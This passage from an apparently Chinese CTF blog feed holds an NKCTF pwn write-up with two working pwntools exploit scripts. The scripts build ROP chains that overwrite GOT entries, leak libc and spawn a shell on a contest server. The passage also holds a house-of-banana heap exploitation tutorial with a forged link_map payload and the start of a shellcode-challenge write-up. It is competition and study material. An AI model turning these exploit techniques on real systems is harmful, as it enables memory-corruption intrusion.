class="built_in">memset</span>(s1, <span class="number">0</span>, <span class="keyword">sizeof</span>(s1));</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30</span>uLL);</span><br><span class="line">  base_decode(s, s1);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(s1, <span class="string">&quot;Welcome to NKCTF!&quot;</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">memset</span>(s1, <span class="number">0</span>, <span class="keyword">sizeof</span>(s1));</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30</span>uLL);</span><br><span class="line">  base_decode(s, s1);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(s1, <span class="string">&quot;tell you a secret:&quot;</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">memset</span>(s1, <span class="number">0</span>, <span class="keyword">sizeof</span>(s1));</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x40</span>uLL);</span><br><span class="line">  base_decode(s, s1);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(s1, <span class="string">&quot;I&#x27;M RUNNING ON GLIBC 2.31-0ubuntu9.9&quot;</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">memset</span>(s1, <span class="number">0</span>, <span class="keyword">sizeof</span>(s1));</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x40</span>uLL);</span><br><span class="line">  base_decode(s, s1);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;can you find me?&quot;</span>) )</span><br><span class="line">    next();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这题实在是太坐牢了 我自己尝试的是ogg爆破 本地关了ASLR以后 写对偏移就通了 但是远程是死活爆破不通 最后换了个办法 可惜了 我觉得我ogg爆破的办法是真的奇才</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line"><span class="comment">#io = remote(&quot;node2.yuzhian.com.cn&quot;,35140)</span></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">libc = ELF(<span class="string">&quot;./glibc-all-in-one/libs/2.32-0ubuntu3.2_amd64/libc-2.32.so&quot;</span>)</span><br><span class="line"><span class="comment">#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc-2.32.so&quot;)</span></span><br><span class="line"><span class="comment">#libc = ELF(&quot;./locate&quot;)</span></span><br><span class="line"><span class="comment"># context.arch = &quot;i386&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        io = remote(<span class="string">&quot;node2.yuzhian.com.cn&quot;</span>,<span class="number">35140</span>)</span><br><span class="line">        io.sendline(<span class="string">b&#x27;V2VsY29tZSB0byBOS0NURiE=\x00&#x27;</span>)</span><br><span class="line">        sleep(<span class="number">0.2</span>)</span><br><span class="line">        io.sendline(<span class="string">b&#x27;dGVsbCB5b3UgYSBzZWNyZXQ6\x00&#x27;</span>)</span><br><span class="line">        sleep(<span class="number">0.2</span>)</span><br><span class="line">        io.sendline(<span class="string">b&#x27;SSdNIFJVTk5JTkcgT04gR0xJQkMgMi4zMS0wdWJ1bnR1OS45\x00&#x27;</span>)</span><br><span class="line">        sleep(<span class="number">0.2</span>)</span><br><span class="line">        io.sendline(<span class="string">b&#x27;Y2FuIHlvdSBmaW5kIG1lPw==\x00&#x27;</span>)</span><br><span class="line">        sleep(<span class="number">0.2</span>)</span><br><span class="line">        rbp_addr = <span class="number">0x000000000040117d</span></span><br><span class="line">        leave_addr = <span class="number">0x00000000004013c2</span></span><br><span class="line">        gadget1_addr = <span class="number">0x401660</span></span><br><span class="line">        gadget2_addr = <span class="number">0x401676</span></span><br><span class="line">        next_addr = <span class="number">0x4013c4</span></span><br><span class="line">        payload = cyclic(<span class="number">0x38</span>)+p64(gadget2_addr)</span><br><span class="line">        payload += cyclic(<span class="number">0x8</span>)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0</span>)+p64(elf.got[<span class="string">&#x27;setbuf&#x27;</span>])+p64(<span class="number">8</span>)+p64(elf.got[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">        payload += p64(gadget1_addr)+p64(<span class="number">0</span>)*<span class="number">7</span>+p64(next_addr)</span><br><span class="line">        <span class="comment"># gdb.attach(io,&#x27;b *0x4013E8&#x27;)</span></span><br><span class="line">        <span class="comment"># pause(0)</span></span><br><span class="line">        sleep(<span class="number">0.2</span>)</span><br><span class="line">        io.send(payload)</span><br><span class="line">        io.send(p16(<span class="number">0x3afe</span>) + p8(<span class="number">0xea</span>))</span><br><span class="line">        payload  = cyclic(<span class="number">0x38</span>)+p64(rbp_addr)+p64(elf.got[<span class="string">&#x27;setbuf&#x27;</span>]-<span class="number">0x8</span>)+p64(leave_addr)</span><br><span class="line">        <span class="comment"># gdb.attach(io,&#x27;b *&#x27;+str(rbp_addr))</span></span><br><span class="line">        <span class="comment"># pause(0)</span></span><br><span class="line">        sleep(<span class="number">0.2</span>)</span><br><span class="line">        io.send(payload)</span><br><span class="line">        sleep(<span class="number">0.2</span>)</span><br><span class="line">        io.sendline(<span class="string">b&#x27;cat flag.txt&#x27;</span>)</span><br><span class="line">        flag = io.recv()</span><br><span class="line">        <span class="keyword">assert</span>(<span class="built_in">len</span>(flag)&gt;<span class="number">0</span>)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        io.interactive()</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        io.close()</span><br></pre></td></tr></table></figure><p>就贴在这了吧 纪念一下死去的理想</p><p>说回正题 开局的那几个base64还是很好绕过的 要注意的是有的末尾要加了\x00 不然不知道为啥过不了strcmp</p><p>随后就是一个栈溢出 长度管够 但是只有这四个函数</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303262307508.png" title="image-20230326230725468" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303262307508.png" alt="image-20230326230725468"></a></p><p>直接覆盖setbuf的got表为puts函数  然后把setbuf当puts使就行了</p><p>注意一下爆破脚本 在前面那一堆payload传输的中间要加sleep 不然会出现奇怪的问题 我就是这个问题卡了好久的远程</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line"><span class="comment">#io = remote(&quot;node2.yuzhian.com.cn&quot;,31530)</span></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">libc = ELF(<span class="string">&quot;./glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;</span>)</span><br><span class="line"><span class="comment">#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc-2.32.so&quot;)</span></span><br><span class="line"><span class="comment">#libc = ELF(&quot;./locate&quot;)</span></span><br><span class="line"><span class="comment"># context.arch = &quot;i386&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">        <span class="comment">#io = remote(&quot;node2.yuzhian.com.cn&quot;,35140)</span></span><br><span class="line">        io.sendline(<span class="string">b&#x27;V2VsY29tZSB0byBOS0NURiE=\x00&#x27;</span>)</span><br><span class="line">        sleep(<span class="number">0.5</span>)</span><br><span class="line">        io.sendline(<span class="string">b&#x27;dGVsbCB5b3UgYSBzZWNyZXQ6\x00&#x27;</span>)</span><br><span class="line">        sleep(<span class="number">0.5</span>)</span><br><span class="line">        io.sendline(<span class="string">b&#x27;SSdNIFJVTk5JTkcgT04gR0xJQkMgMi4zMS0wdWJ1bnR1OS45\x00&#x27;</span>)</span><br><span class="line">        sleep(<span class="number">0.5</span>)</span><br><span class="line">        io.sendline(<span class="string">b&#x27;Y2FuIHlvdSBmaW5kIG1lPw==\x00&#x27;</span>)</span><br><span class="line">        sleep(<span class="number">0.5</span>)</span><br><span class="line">        rbp_addr = <span class="number">0x000000000040117d</span></span><br><span class="line">        leave_addr = <span class="number">0x00000000004013c2</span></span><br><span class="line">        gadget1_addr = <span class="number">0x401660</span></span><br><span class="line">        gadget2_addr = <span class="number">0x401676</span></span><br><span class="line">        read_addr = <span class="number">0x401090</span></span><br><span class="line">        rsi_r15 = <span class="number">0x0000000000401681</span></span><br><span class="line">        rdi_addr = <span class="number">0x0000000000401683</span></span><br><span class="line">        main_addr = <span class="number">0x4013E9</span></span><br><span class="line">        ret_addr = <span class="number">0x000000000040101a</span></span><br><span class="line">        next_addr = <span class="number">0x4013c4</span></span><br><span class="line">        payload = cyclic(<span class="number">0x38</span>)+p64(rdi_addr)+p64(<span class="number">0</span>)+p64(rsi_r15)+p64(elf.got[<span class="string">&#x27;setbuf&#x27;</span>])*<span class="number">2</span>+p64(elf.sym[<span class="string">&#x27;read&#x27;</span>])+p64(rdi_addr)+p64(elf.got[<span class="string">&#x27;read&#x27;</span>])+p64(elf.sym[<span class="string">&#x27;setbuf&#x27;</span>])+p64(next_addr)</span><br><span class="line">        <span class="comment"># gdb.attach(io,&#x27;b *&#x27;+str(rdi_addr))</span></span><br><span class="line">        <span class="comment"># pause(0)</span></span><br><span class="line">        io.send(payload)</span><br><span class="line">        sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="comment"># pause()</span></span><br><span class="line">        <span class="comment"># gdb.attach(io,&#x27;b *0x4013C4&#x27;)</span></span><br><span class="line">        <span class="comment"># pause(0)</span></span><br><span class="line">        io.send(p16(<span class="number">0x4420</span>))</span><br><span class="line">        read_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">        libc_addr = read_addr  - libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">        success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">        system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">        binsh_addr = libc_addr + libc.search(<span class="string">b&quot;/bin/sh&quot;</span>).__next__()</span><br><span class="line">        payload = cyclic(<span class="number">0x38</span>)+p64(ret_addr)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line">        io.send(payload)</span><br><span class="line">        io.sendline(<span class="string">b&#x27;cat flag.txt&#x27;</span>)</span><br><span class="line">        flag = io.recv()</span><br><span class="line">        <span class="keyword">assert</span>(<span class="built_in">len</span>(flag)&gt;<span class="number">0</span>)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        io.interactive()</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        io.close()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>house of banana</title>
      <link href="/2023/03/24/house-of-banana/"/>
      <url>/2023/03/24/house-of-banana/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>功能十分强大的一个house of 系列 可以执行onegadget或者是system(“&#x2F;bin&#x2F;sh”)来获取shell<br>原理是通过largebinattack把chunk_addr覆盖程序执行exit时所需要的结构体 进行伪造 这样就可以劫持exit函数</p><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>我们在之前的栈部分学习中 学过篡改fini_array 来进行一个重复执行main函数</p><p>但是其利用需要关闭RELRO保护 然而堆题基本都是保护全开 所以很少用到 今天来学习一下伪造fini_array赋值用到的结构体 从而控制程序exit时的程序执行流</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303241721538.png" title="image-20230324172120454" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303241721538.png" alt="image-20230324172120454"></a></p><p>利用源码调试 可以知道 fini_array是在&#x2F;elf&#x2F;dl-fini.c的139行被调用的  那么我们跟进一下源码 看一下赋值逻辑</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    ElfW(Addr) *<span class="built_in">array</span> =</span><br><span class="line">    (ElfW(Addr) *) (l-&gt;l_addr</span><br><span class="line">            + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">            / <span class="keyword">sizeof</span> (ElfW(Addr)));</span><br><span class="line">    <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">    ((<span class="type">fini_t</span>) <span class="built_in">array</span>[i]) ();</span><br><span class="line">&#125;`</span><br></pre></td></tr></table></figure><p>array &#x3D; (l-&gt;l_addr + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr)</p><p>貌似和l这个链表有关 朔源一下l的定义</p><p>struct link_map *l &#x3D; maps[i]</p><p>继续朔源一下maps数组的赋值</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">define <span class="title function_">GL</span><span class="params">(name)</span> _rtld_global._#<span class="meta">#name</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">for</span> <span class="params">(l = GL(dl_ns)[ns]._ns_loaded, i = <span class="number">0</span>; l != <span class="literal">NULL</span>; l = l-&gt;l_next)</span></span><br><span class="line"><span class="comment">/* Do not handle ld.so in secondary namespaces.  */</span></span><br><span class="line"><span class="title function_">if</span> <span class="params">(l == l-&gt;l_real)</span></span><br><span class="line">    &#123;</span><br><span class="line">assert (i &lt; nloaded);</span><br><span class="line"></span><br><span class="line">maps[i] = l;</span><br><span class="line">l-&gt;l_idx = i;</span><br><span class="line">++i;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Bump l_direct_opencount of all objects so that they</span></span><br><span class="line"><span class="comment">    are not dlclose()ed from underneath us.  */</span></span><br><span class="line">++l-&gt;l_direct_opencount;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>maps的赋值和GL(dl_ns)[ns]._ns_loaded这个结构体有关系 所以我们只需要伪造该结构体 就能操控maps的值 从而操控</p><p>fini_array的内容</p><p>每一次for循环后l的赋值可以看出来其是一个链表 看其他师傅的介绍是必须有四个元素 也就有两种做法 截取第一个节点开始伪造 或者是从第三个节点开始伪造 前者伪造的更加麻烦 这里先来介绍后者的</p><h2 id="劫持第三个节点"><a href="#劫持第三个节点" class="headerlink" title="劫持第三个节点"></a>劫持第三个节点</h2><p>首先需要获得第三个节点的位置 采用计算和_rtld_global结构体的偏移来得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">distance &amp;_rtld_global &amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next)</span><br></pre></td></tr></table></figure><p>接着为了进入if分支 我们还需要通过第一个判断</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">l == l-&gt;l_real</span><br></pre></td></tr></table></figure><p>也就是在fake+0x28处需要写入fake地址</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span> =</span> maps[i];</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (l-&gt;l_init_called)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/* Make sure nothing happens if we are called twice.  */</span></span><br><span class="line">          l-&gt;l_init_called = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Is there a destructor function?  */</span></span><br><span class="line">          <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span></span><br><span class="line">              || (ELF_INITFINI &amp;&amp; l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>))</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">/* When debugging print a message first.  */</span></span><br><span class="line">              <span class="keyword">if</span> (__builtin_expect (GLRO(dl_debug_mask)</span><br><span class="line">                        &amp; DL_DEBUG_IMPCALLS, <span class="number">0</span>))</span><br><span class="line">            _dl_debug_printf (<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>,</span><br><span class="line">                      DSO_FILENAME (l-&gt;l_name),</span><br><span class="line">                      ns);</span><br></pre></td></tr></table></figure><p>for循环中还有这样一段 为了使for循环顺利执行 我们同样需要绕过这里的if判断</p><p>需要绕过l-&gt;l_init_called 不过这里貌似不能是个1就行 需要伪造成其原本的值 和上面的一样 查一下偏移和所需要的值</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">distance _rtld_global._dl_ns[0]._ns_loaded  &amp;(_rtld_global._dl_ns[0]._ns_loaded)-&gt;l_init_called</span><br><span class="line">x/wx &amp;(_rtld_global._dl_ns[0]._ns_loaded)-&gt;l_init_called </span><br></pre></td></tr></table></figure><p>第二个if用的是或 通过一个就行了 这里选第一个 可以一并绕过下一个if </p><p>l-&gt;l_info[DT_FINI_ARRAY] !&#x3D; NULL</p><p>同时注意一下下面maps赋值的操作 </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ElfW(Addr) *array = (ElfW(Addr) *) (l-&gt;l_addr + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br></pre></td></tr></table></figure><p>fini_array的值由l-&gt;l_info[DT_FINI_ARRAY]决定</p><p>我们还需要控制i的值 i由下面这个式子得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val / sizeof (ElfW(Addr)))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">distance  (_rtld_global._dl_ns[0]._ns_loaded)  &amp;((_rtld_global._dl_ns[0]._ns_loaded)-&gt;l_info[28])</span><br></pre></td></tr></table></figure><p>这里的i跟随着系统原本的布局</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303242045629.png" title="image-20230324204525562" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303242045629.png" alt="image-20230324204525562"></a></p><p>并且你会发现 i的值应该是存放在对应偏移地址的下一个字长处</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303242046709.png" title="image-20230324204609677" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303242046709.png" alt="image-20230324204609677"></a></p><p>同理可得 我们还需要关注一下l-&gt;l_info[DT_FINI_ARRAY]需要怎么构造</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303242046920.png" title="image-20230324204658884" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303242046920.png" alt="image-20230324204658884"></a></p><p>同样是需要把地址放在下一个字长处 并且需要经过两次跳转</p><p>总结一下就是按照下面这样构造 这里的偏移因人而异 我把所有的偏移都减去了0x10 是因为fake是从chunk头开始算的 而edit是从chunk的用户空间开始</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(fake_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x38</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(fake_addr+<span class="number">0x58</span>)+p64(<span class="number">8</span>)+p64(onegadget_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(fake_addr+<span class="number">0x40</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x110</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(fake_addr+<span class="number">0x48</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x31c</span>-<span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(<span class="number">0x1c</span>)</span><br></pre></td></tr></table></figure><p>更加详细的流程可以看这位师傅的博客 我只是做个总结</p><p><a href="https://giles-one.github.io/2021/10/04/house-of-%E7%B3%BB%E5%88%97%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/">house_of_banana源码分析 | Blog of cat03 (giles-one.github.io)</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> heap </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2023Nu1l纳新赛</title>
      <link href="/2023/03/22/2023Nu1l%E7%BA%B3%E6%96%B0%E8%B5%9B/"/>
      <url>/2023/03/22/2023Nu1l%E7%BA%B3%E6%96%B0%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h1><p>比赛的时候早上瞧了一个小时然后有事出去了 没看到提示 不然可能还做的出来 但是不得不说Nu1l水平确实要求高 我还没远远不够</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hint1: `movq rsp, xmm2`</span><br><span class="line">hint2: 利用 `shellcode` 构造自己的 `gadget` 转为 `ROP`</span><br></pre></td></tr></table></figure><h1 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h1><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303222050440.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303222050440.png" alt="image.png"></a><br>保护全开 环境是2.31<br>开启了沙盒<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303222050156.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303222050156.png" alt="image.png"></a><br>ida打开看一看</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  sandbox();</span><br><span class="line">  buf = mmap((<span class="type">void</span> *)<span class="number">0x2023000</span>, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Try to ORW in limited bytes!&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x11</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Hope that works~&quot;</span>);</span><br><span class="line">  mprotect(buf, <span class="number">0x1000</span>uLL, <span class="number">4</span>);</span><br><span class="line">  JUMPOUT(<span class="number">0x2023000</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总体的思路非常简单 read往0x2023000读入0x11字节的shellcode 随后mprotect把0x2023000对应的页调为可读可写不可执行 随后jmp过去 在栈帧结束的时候 各个寄存器的值都被设置成了2023</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000000000</span>C88                 mov     r15, <span class="number">2023000</span>h</span><br><span class="line">.text:<span class="number">0000000000000</span>C8F                 mov     rax, <span class="number">2023</span>h</span><br><span class="line">.text:<span class="number">0000000000000</span>C96                 mov     rbx, <span class="number">2023</span>h</span><br><span class="line">.text:<span class="number">0000000000000</span>C9D                 mov     rcx, <span class="number">2023</span>h</span><br><span class="line">.text:<span class="number">0000000000000</span>CA4                 mov     rdx, <span class="number">2023</span>h</span><br><span class="line">.text:<span class="number">0000000000000</span>CAB                 mov     rsp, <span class="number">2023</span>h</span><br><span class="line">.text:<span class="number">0000000000000</span>CB2                 mov     rbp, <span class="number">2023</span>h</span><br><span class="line">.text:<span class="number">0000000000000</span>CB9                 mov     rsi, <span class="number">2023</span>h</span><br><span class="line">.text:<span class="number">0000000000000</span>CC0                 mov     rdi, <span class="number">2023</span>h</span><br><span class="line">.text:<span class="number">0000000000000</span>CC7                 mov     r8, <span class="number">2023</span>h</span><br><span class="line">.text:<span class="number">0000000000000</span>CCE                 mov     r9, <span class="number">2023</span>h</span><br><span class="line">.text:<span class="number">0000000000000</span>CD5                 mov     r10, <span class="number">2023</span>h</span><br><span class="line">.text:<span class="number">0000000000000</span>CDC                 mov     r11, <span class="number">2023</span>h</span><br><span class="line">.text:<span class="number">0000000000000</span>CE3                 mov     r12, <span class="number">2023</span>h</span><br><span class="line">.text:<span class="number">0000000000000</span>CEA                 mov     r13, <span class="number">2023</span>h</span><br><span class="line">.text:<span class="number">0000000000000</span>CF1                 mov     r14, <span class="number">2023</span>h</span><br></pre></td></tr></table></figure><p>0x11肯定不够写 我们不仅要构造mprotect调权限 还要构造read写入orw<br>先来看一下提示吧  <strong>movq rsp, xmm2</strong>  xmm2是浮点数寄存器 将其值赋给rsp寄存器 为什么这么干?<br>看一看xmm2中存的是什么<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303222131802.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303222131802.png" alt="image.png"></a><br>欸 有一个libc地址 那么想的是构造write函数泄露基址 但是直接赋值給rsi寄存器是不行的<br>因为我们还需要构造rop链 rop链要么就是劫持程序执行流 要么就是写shellcode 然后要求对应地址有可执行权限 后者显然是不行的 所以要利用rsp指针在libc地址执行rop链 调用了mprotect函数后我们再迁移到0x2023000写rop<br>那么总结一下思路 我们要利用17字节的shellcode 做到write基址 read读入rop链 显然是捉襟见肘 这里学习了这位师傅的方法 实在有点大开眼界<br><a href="https://www.wingszeng.top/2023-n1ctf-junior-pwn-shellcodemaster/">2023 N1CTF Junior Pwn ShellcodeMaster - Wings 的博客 (wingszeng.top)</a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    movq rsp,xmm2</span><br><span class="line">    push rsp</span><br><span class="line">    pop rsi</span><br><span class="line">l:</span><br><span class="line">    shr edi, <span class="number">13</span></span><br><span class="line">    and eax, edi</span><br><span class="line">    syscall</span><br><span class="line">    jnz l</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure><p>利用push和pop来实现寄存器互传参 shr指令是逻辑右移 这样edi就只剩下1了<br>随后利用and指令 将eax和edi进行逻辑与操作 并将结果赋值给eax 也就是1  并且此时运算结果不为0 